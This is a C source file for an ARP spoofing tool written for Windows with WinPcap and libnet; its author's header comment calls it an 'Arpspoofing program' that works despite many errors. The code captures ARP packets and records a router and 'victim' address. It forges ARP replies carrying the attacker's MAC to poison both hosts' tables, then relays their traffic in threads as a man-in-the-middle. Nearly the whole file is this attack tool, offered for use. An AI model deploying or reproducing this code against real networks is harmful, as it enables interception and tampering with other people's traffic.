/*
Written by Ukjin Jang.
Arpspoofing program code, but it isn't perfect.
So complex code, it have many error.
But it can execute and quite many work.
I draw a painting for descript it, who need that I can give it.
It's code written by CentOS 6.8 Linux.
This code need compile option; -lpthread, -lpcap
So when compile it, write instruction like 'gcc -o arpsniffer arpsniffer.c -lpthread -lpcap'
And this program execute, write instruction like './arpsniffer arp'

- I changed OS for develope from CentOS to Windows. So I modify this program, you don't have to prepare anything.
- Visual C++ Express 2010 version, you only need to do one thing.
- First, go to Project Properties. And click "Debugging" tab. Input a text "arp"
- Done !
*/
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <WinSock2.h>
#include <process.h>
#include <IPHlpApi.h>
#include <libnet\include\win32\libnet.h>
#define PROMISCUOUS 1
#define NONPROMISCUOUS 0
#pragma comment(lib, "wpcap.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Packet.lib")
#pragma comment(lib, "iphlpapi.lib")


void callback(u_char *useless, const struct pcap_pkthdr *pkthdr, u_char *packet);	// callback used by pcap_loop function
void mac_print(u_int8_t *eth);					// mac_address print function
void print_packet(int len, u_char *packet);		// packet print function
void swap(u_char *A, u_char *B);		// packet swapping
int flag_check(u_char *a, u_char *b);	// compare with each of u_char value
void * relay_request(void * arg);			// it is thread. 
void * relay_reply(void * arg); 

// used by thread
pcap_t *pcap;
u_char *pkt;
const struct pcap_pkthdr *hdr;
HANDLE hThread;
DWORD hId;
CRITICAL_SECTION hCS;
int acnt = 0;

// saving each of address
u_char my_mac[6];
u_char *my_ip;
u_char router_mac[6];
u_char router_ip[4];
u_char victim_mac[6];
u_char victim_ip[4];
u_char broad_ip[4];

u_char broadcast_f[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
u_char broadcast_0[6] = {0x00,0x00,0x00,0x00,0x00,0x00};

struct arphdr {		// arp_header structure. Libnet don't have mac or ip address in arp header, so declare it.
	u_int16_t htype;
	u_int16_t ptype;
	u_char hlen;
	u_char plen;
	u_int16_t oper;
	u_char sha[6];		// Sender hardware address
	u_char spa[4];		// Sender IP address
	u_char tha[6];		// Target hardware address
	u_char tpa[4];		// Target IP address
}; 

int main(int argc, char *argv[]) {
	int i = 0, num = 0, s = 0;
	unsigned long long tmp = 0;		// mac address is hexa-decimal. so u_ll variable declare.
	struct in_addr net_addr, mask_addr;
	bpf_u_int32 netp, maskp;
	struct bpf_program filter;
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_if_t *alldevs, *ex;		// it using for owner interface card finding
	char *net, *mask;
	PHOSTENT hostData;
	WSADATA wsaData;
	char host[30];
	
	PIP_ADAPTER_INFO info;
	DWORD size = sizeof(PIP_ADAPTER_INFO);
	ZeroMemory(&info, size);

	if (pcap_findalldevs(&alldevs, errbuf) == -1) {	// find all devices
		fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}

	for(ex = alldevs; ex; ex=ex->next) {			// print out all devices
		printf("%d. %s", ++i, ex->name);
		if (ex->description) printf(" (%s)\n", ex->description);
		else printf(" (No description available)\n");
	}
    
	if(i == 0) {
		printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
		return -1;
	}
	printf("Enter the interface number (1-%d):", i);	// select using device
	scanf("%d", &num);

	if(num < 1 || num > i) {
		printf("\nInterface number out of range.\n");
		pcap_freealldevs(alldevs);
		return -1;
	}
	if(argc != 2) {
		printf("Usage : ./arpsniffer <ip/arp..> \n");	// refer to code descript
		return -1;
	}
	i = 0;

	for(ex = alldevs; i < num; ex=ex->next) {
		alldevs = ex;
		i++;
	}

	i = GetAdaptersInfo(info, &size);
	if(i == ERROR_BUFFER_OVERFLOW) {
		info = (PIP_ADAPTER_INFO)malloc(size);
		GetAdaptersInfo(info, &size);
	}
	for (i = 0; i < ETHER_ADDR_LEN; i++)
		*(my_mac+i) = *(info->Address+i);
	
	// Look up info from the capture device.
	if(pcap_lookupnet(alldevs->name , &netp, &maskp, errbuf) == -1) {
		fprintf(stderr, "ERROR: %s\n", errbuf);
		exit(1);
	}

	pcap =  pcap_open_live(alldevs->name, 5000, NONPROMISCUOUS, -1, errbuf);
	// Compiles the filter expression into a BPF filter program
	if (pcap_compile(pcap, &filter, argv[1], 0, maskp) == -1) {
		fprintf(stderr, "ERROR: %s\n", pcap_geterr(pcap) );
		exit(1);
	}
	net_addr.s_addr = netp;
	net = inet_ntoa(net_addr);
	printf("NET : %s\n", net);

	mask_addr.s_addr = maskp;
	mask = inet_ntoa(mask_addr);
	printf("MSK : %s\n", mask);
	printf("=======================\n");

	if(gethostname(host, sizeof host) != 0) printf("Error......Hostname not found\n");
	if((hostData = gethostbyname(host)) == NULL) printf("Gethostbyname Error!!\n");
	i = 0;
	while(hostData->h_addr_list[i]) my_ip = (u_char *)inet_ntoa(*(struct in_addr *)hostData->h_addr_list[i++]);
	i = 0;
	while(1) {
		if(my_ip[++i] == '.') s++;
		if(s == 3) break;
	}
	memcpy( my_ip, &my_ip[i+1], 3);
	my_ip[3] = '\0';

	if (pcap_setfilter(pcap, &filter) == -1) {
		fprintf(stderr, "ERROR: %s\n", pcap_geterr(pcap) );
		exit(1);
	}
	pcap_loop(pcap, -1, (pcap_handler)callback, NULL);	// pcap_loop start!!
}

void callback(u_char *useless, const struct pcap_pkthdr *pkthdr, u_char *packet) {
	struct arphdr *arpheader;
	struct libnet_ethernet_hdr *eth;
	int i = 0, j = 0, cnt = 0, size = 0;
	int length = pkthdr->len;
	pkt = packet; hdr = pkthdr;		// passing value for thread
	
	if(acnt == 0) {		// beginning thread value is zero. After thread create, thread value is random
		acnt++;
		hThread = (HANDLE)_beginthreadex(NULL, 0, (u_int(__stdcall *)(void *))relay_request, NULL, 0, (u_int*)&hId);	// relay_test function is working to thread
		hThread = (HANDLE)_beginthreadex(NULL, 0, (u_int(__stdcall *)(void *))relay_reply, NULL, 0, (u_int*)&hId);	// relay_test function is working to thread
	}

	eth = (struct libnet_ethernet_hdr *)packet;
	arpheader = (struct arphdr *)(packet + sizeof(struct libnet_ethernet_hdr));
	printf("\n\nReceived Packet Size: %d bytes\n", length);	// packet size
	printf("Ether Src : ");	mac_print(eth->ether_shost);	// source mac address
	printf("\nEther Dst : "); mac_print(eth->ether_dhost);	// destination mac address
	printf("\nEther Type : %04x\n", ntohs(eth->ether_type));// next layer type
	printf("Hardware type: %s\n", (ntohs(arpheader->htype) == ARPHRD_ETHER) ? "Ethernet" : "Unknown"); 
	printf("Protocol type: %s\n", (ntohs(arpheader->ptype) == ETHERTYPE_IP) ? "IPv4" : "Unknown"); 
	printf("Operation: %s\n", (ntohs(arpheader->oper) == ARPOP_REQUEST)? "ARP Request" : "ARP Reply"); 
 
	if (ntohs(arpheader->htype) == 1 && ntohs(arpheader->ptype) == 0x0800) { // print out each of address
		printf("ARP Sender MAC: ");
		for(i = 0; i < 6; i++) {
			printf("%02x:", arpheader->sha[i]); 
			if(i == 4) printf("%02x", arpheader->sha[++i]);
		}

		printf("\nARP Sender IP: "); 
		for(i = 0; i < 4; i++) {
			printf("%d.", arpheader->spa[i]); 
			if(i == 2) printf("%d", arpheader->spa[++i]);
		}

		printf("\nARP Target MAC: "); 
		for(i = 0; i < 6; i++) {
			printf("%02x:", arpheader->tha[i]); 
			if(i == 4) printf("%02x", arpheader->tha[++i]);
		}

		printf("\nARP Target IP: "); 
		for(i = 0; i < 4; i++) {
			printf("%d.", arpheader->tpa[i]); 
			if(i == 2) printf("%d", arpheader->tpa[++i]);
		}

		printf("\n");
	}

	print_packet(length, packet);	// print out packet data

	// size variable is exist for usability.
	size = sizeof(struct libnet_ethernet_hdr) + sizeof(arpheader->htype) + sizeof(arpheader->ptype) + sizeof(arpheader->hlen) + sizeof(arpheader->plen);

	// deduct router's mac address. First, owner's arp table delete. Next, arp packet sended to router automatically. Then we can get router's mac address.
	// arp_reply packet & owner mac address is correct with packet's ethernet destination mac address
	// Also, packet's sender mac address isn't correct with packet's target mac address. Because of own packet is comeback!
	if(ntohs(arpheader->oper) == ARPOP_REPLY && flag_check(eth->ether_dhost, my_mac) != 1 && flag_check(arpheader->sha, arpheader->tha) == 1 && *router_mac == 0) { 
 		printf("\nGot the Router's Mac : "); 
 		for(i = 0; i < ETHER_ADDR_LEN; i++)  
 			*(router_mac+i) = *(packet + sizeof(eth->ether_dhost) + i); 
 		mac_print((u_int8_t *)router_mac); 
 	} 

	// very long if statement.
	// only request packet & target mac address is broadcast & must not enter to router & must not enter to same ip & must not enter to own sending packet
	if(ntohs(arpheader->oper) == ARPOP_REQUEST && flag_check(eth->ether_dhost, broadcast_f) != 1 && flag_check(arpheader->tha, broadcast_0) != 1 && flag_check(arpheader->sha, router_mac) == 1 && *(arpheader->spa+3) != *(arpheader->tpa+3) && flag_check(arpheader->sha, my_mac) == 1) {
		if(*router_ip == 0) {		// save to router ip address 
			printf("\nGot the Router's IP : "); 
			for(i = 0; i < 4; i++) { 
				*(router_ip+i) = *(arpheader->tpa+i); 
				printf("%d.", *(router_ip+i)); 
			} 
		} 
		if(*(router_ip+3)==*(arpheader->tpa+3)) {
			for(i = 0; i < ETHER_ADDR_LEN; i++) *(victim_mac+i) = *(arpheader->sha+i);	// save to victim mac address
			for(i = 0; i < 4; i++) *(victim_ip+i) = *(arpheader->spa+i);		// save to victim ip address
	
			printf("\n\nPacket Changing...\n");
			for(i = 0; i < ETHER_ADDR_LEN; i++) {
				*(packet+i) = *(my_mac+i);
				swap(packet+i, packet+(i+ETHER_ADDR_LEN));
			}
	
			packet += size;
			*(packet+1) = ARPOP_REPLY;
			packet += sizeof(arpheader->oper);
			for(i = 0; i < 10; i++) {
				if(i < ETHER_ADDR_LEN) *(packet+(i+10)) = *(my_mac+i);
				swap(packet+i, packet+(i+10));
			}
			Sleep(100);
			packet -= size + sizeof(arpheader->oper);
			printf("Packet Change Success!!\nChanged Packet Sending...\n");
			pcap_sendpacket(pcap, packet, length);
			printf("Packet Send Success!!\nYour atk_packet is..\n");
			print_packet(length, packet);
	
			packet += size;
			*(packet+1) = ARPOP_REQUEST;
			packet += sizeof(arpheader->oper) + sizeof(arpheader->sha) + sizeof(arpheader->spa);
			for(i = 0; i < ETHER_ADDR_LEN; i++) *(packet+i) = *(broadcast_0+i);
			packet -= size + sizeof(arpheader->oper) + sizeof(arpheader->sha) + sizeof(arpheader->spa);
			printf("\nSend a Request Packet to victim...\n");
			pcap_sendpacket(pcap, packet, length);
			printf("Request Success!!\nYour request packet is..\n");
			print_packet(length, packet);
		}
	}

	// it is send packet to router for router's table change
	if(ntohs(arpheader->oper) == ARPOP_REQUEST && flag_check(eth->ether_shost, router_mac) != 1 && flag_check(arpheader->sha, router_mac) != 1) {
		printf("\nRouter's Broadcast Receive!!\nPacket Creating..\n");
		for(i = 0; i < ETHER_ADDR_LEN; i++) *(packet+i) = *(router_mac+i);

		for(i = 0; i < ETHER_ADDR_LEN; i++) {
			*(packet+i) = *(my_mac+i);
			swap(packet+i, packet+(i+ETHER_ADDR_LEN));
		}

		packet += size;
		*(packet+1) = ARPOP_REPLY;
		packet += sizeof(arpheader->oper);
		for(i = 0; i < 10; i++) {
			if(i < ETHER_ADDR_LEN) *(packet+(i+10)) = *(my_mac+i);
			else *(broad_ip+i) = *(packet+(i+10));
			swap(packet+i, packet+(i+10));
		}
		packet -= size + sizeof(arpheader->oper);
		printf("\nPacket Creating Finished!!\nCreated Packet Sending...\n");
		pcap_sendpacket(pcap, packet, length);
		printf("Created Packet Send Success!!\nYour created_packet is..\n");
		print_packet(length, packet);
	}
}

void mac_print(u_int8_t *eth) {	// print mac address
	int i = 0;
	while(i < ETHER_ADDR_LEN) {
		printf("%02x:", eth[i]);
		if((i+1) == (ETHER_ADDR_LEN-1))
			printf("%02x", eth[++i]);
		i++;
	}
}

void print_packet(int len, u_char *packet) {	// print packet
	int cnt = 0;
	while(len--) {
		printf("%02x ", *(packet++)); 
		if ((++cnt % 16) == 0) printf("\n");
	}
}

void swap(u_char *A, u_char *B) {	// used by packet swapping
	u_char tmp = *A;
	*A = *B;
	*B = tmp;
}

int flag_check(u_char *a, u_char *b) {	// compare with mac address
	int value = 0;
	value = (*a != *b ? 1 : ((*(a+1) != *(b+1)) ? 1 : ((*(a+2) != *(b+2)) ? 1 : ((*(a+3) != *(b+3)) ? 1 : ((*(a+4) != *(b+4)) ? 1 : ((*(a+5) != *(b+5)) ? 1 : -1))))));
	return value;
}

void * relay_request(void * arg) {	// thread function
	int i = 0, length = 0;
	struct arphdr *arph;
	struct libnet_ethernet_hdr *ether;
	while(1) {
		length = hdr->len;
		ether = (struct libnet_ethernet_hdr *)pkt;
		arph = (struct arphdr *)(pkt + sizeof(struct libnet_ethernet_hdr));
		// victim is send to owner by request packet, this if-statement work.
		if(ntohs(arph->oper) == ARPOP_REQUEST && flag_check(ether->ether_dhost, my_mac) != 1 && *(arph->tpa+3) == *(router_ip+3)) {
			for(i = 0; i < ETHER_ADDR_LEN; i++) *(pkt+i) = *(router_mac+i);
			
			pkt += sizeof(ether->ether_dhost);
			
			for(i = 0; i < ETHER_ADDR_LEN; i++) *(pkt+i) = *(my_mac+i);
	
			pkt += sizeof(ether->ether_shost) + sizeof(ether->ether_type) + sizeof(struct arphdr) - sizeof(arph->tpa) - sizeof(arph->tha) - sizeof(arph->spa) - sizeof(arph->sha);
			
			for(i = 0; i < ETHER_ADDR_LEN; i++) *(pkt+i) = *(my_mac+i);

			pkt += sizeof(arph->sha) + sizeof(arph->spa);

			for(i = 0; i < ETHER_ADDR_LEN; i++) *(pkt+i) = *(router_mac+i);

			pkt -= sizeof(struct libnet_ethernet_hdr) + sizeof(struct arphdr) - sizeof(arph->tha) - sizeof(arph->tpa);

			printf("\nSend a packet to Router in Thread..\n");
			pcap_sendpacket(pcap, pkt, length);
		}
	}	
	WaitForSingleObject(hThread, INFINITE);
}

void * relay_reply(void * arg) {
	int i = 0, length = 0;
	struct arphdr *arph;
	struct libnet_ethernet_hdr *ether;
	while(1) {
		length = hdr->len;
		ether = (struct libnet_ethernet_hdr *)pkt;
		arph = (struct arphdr *)(pkt + sizeof(struct libnet_ethernet_hdr));
		// router is send to owner by reply packet, this if-statement work.
		if(ntohs(arph->oper) == ARPOP_REPLY && flag_check(ether->ether_dhost, my_mac) != 1 && *(arph->tpa+3) != atoi((const char *)my_ip)) {
			for(i = 0; i < ETHER_ADDR_LEN; i++) *(pkt+i) = *(victim_mac+i);
			
			pkt += sizeof(ether->ether_dhost);
			
			for(i = 0; i < ETHER_ADDR_LEN; i++) *(pkt+i) = *(my_mac+i);
	
			pkt += sizeof(ether->ether_shost) + sizeof(ether->ether_type) + sizeof(struct arphdr) - sizeof(arph->tpa) - sizeof(arph->tha) - sizeof(arph->spa) - sizeof(arph->sha);
			
			for(i = 0; i < ETHER_ADDR_LEN; i++) *(pkt+i) = *(my_mac+i);

			pkt += sizeof(arph->sha) + sizeof(arph->spa);

			for(i = 0; i < ETHER_ADDR_LEN; i++) *(pkt+i) = *(victim_mac+i);

			pkt -= sizeof(struct libnet_ethernet_hdr) + sizeof(struct arphdr) - sizeof(arph->tha) - sizeof(arph->tpa);

			printf("\nSend a packet to Router in Thread..\n");
			pcap_sendpacket(pcap, pkt, length);
		}
	}
	WaitForSingleObject(hThread, INFINITE);
}
